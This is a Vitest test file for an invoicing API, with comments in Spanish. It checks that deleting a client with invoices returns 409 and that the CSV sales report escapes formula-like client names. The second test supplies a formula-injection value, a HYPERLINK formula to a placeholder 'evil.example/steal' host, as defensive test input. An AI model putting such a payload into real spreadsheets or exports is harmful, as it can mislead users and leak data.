import { beforeEach, afterAll, describe, expect, it } from "vitest";
import request from "supertest";
import { app } from "./helpers/app";
import { resetDb, disconnectDb } from "./helpers/db";
import { createAdmin, createProduct, loginAs } from "./helpers/factories";

describe("Clients", () => {
  let adminToken: string;

  beforeEach(async () => {
    await resetDb();
    const admin = await createAdmin({ email: "admin@test.local" });
    adminToken = (await loginAs(admin.email)).body.accessToken;
  });

  afterAll(async () => {
    await disconnectDb();
  });

  it("no permite borrar un cliente con facturas (409, no 500)", async () => {
    const clientRes = await request(app)
      .post("/api/v1/clients")
      .set("Authorization", `Bearer ${adminToken}`)
      .send({ name: "Con facturas" });
    const clientId = clientRes.body.client.id;

    const product = await createProduct({ price: 10, stock: 10 });
    await request(app)
      .post("/api/v1/invoices")
      .set("Authorization", `Bearer ${adminToken}`)
      .send({ clientId, items: [{ productId: product.id, quantity: 1 }] });

    const deleteRes = await request(app)
      .delete(`/api/v1/clients/${clientId}`)
      .set("Authorization", `Bearer ${adminToken}`);

    expect(deleteRes.status).toBe(409);
    expect(deleteRes.body.error.code).toBe("FOREIGN_KEY_CONSTRAINT");
  });

  it("el reporte de ventas en CSV neutraliza nombres de cliente que parecen fórmulas", async () => {
    // Cualquier usuario autenticado puede crear un cliente (no requiere
    // ADMIN) — un nombre así, sin sanitizar, se ejecutaría como fórmula al
    // abrir el CSV exportado en Excel/Sheets.
    const maliciousName = '=HYPERLINK("http://evil.example/steal","click")';
    const clientRes = await request(app)
      .post("/api/v1/clients")
      .set("Authorization", `Bearer ${adminToken}`)
      .send({ name: maliciousName });
    const clientId = clientRes.body.client.id;

    const product = await createProduct({ price: 10, stock: 10 });
    await request(app)
      .post("/api/v1/invoices")
      .set("Authorization", `Bearer ${adminToken}`)
      .send({ clientId, items: [{ productId: product.id, quantity: 1 }] });

    const csvRes = await request(app)
      .get("/api/v1/dashboard/sales-report?format=csv")
      .set("Authorization", `Bearer ${adminToken}`);

    expect(csvRes.status).toBe(200);
    // La celda debe llevar el apóstrofe neutralizante antes del "=" (con las
    // comillas internas escapadas como "" por el propio CSV), y en ningún
    // caso debe aparecer un "=" pegado al inicio de una celda entre comillas
    // (eso es lo que Excel interpretaría como fórmula).
    const expectedEscapedCell = `"'${maliciousName.replace(/"/g, '""')}"`;
    expect(csvRes.text).toContain(expectedEscapedCell);
    expect(csvRes.text).not.toMatch(/,"=/);
  });
});
